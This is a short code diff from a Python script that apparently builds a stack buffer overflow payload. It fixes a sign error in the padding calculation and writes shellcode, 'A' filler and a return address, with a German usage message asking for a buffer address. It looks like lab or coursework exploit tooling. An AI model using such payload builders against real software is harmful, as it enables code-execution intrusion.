@@ -42,7 +42,7 @@ if len(sys.argv) == 4:
     os.system("rm a.txt")
     os.system("rm a.bin")
 
-    padding_size = 224 - (len(shellcode)) - -(int((len(sys.argv[1]) / 2)) + 2)
+    padding_size = 224 - (len(shellcode)) - (int((len(sys.argv[1]) / 2)) + 2)
     os.write(1, shellcode + b"A" * padding_size + address)
 else:
     print("Wie folgt zu Benutzen:", "Programmname:", sys.argv[0], "Bufferadresse",
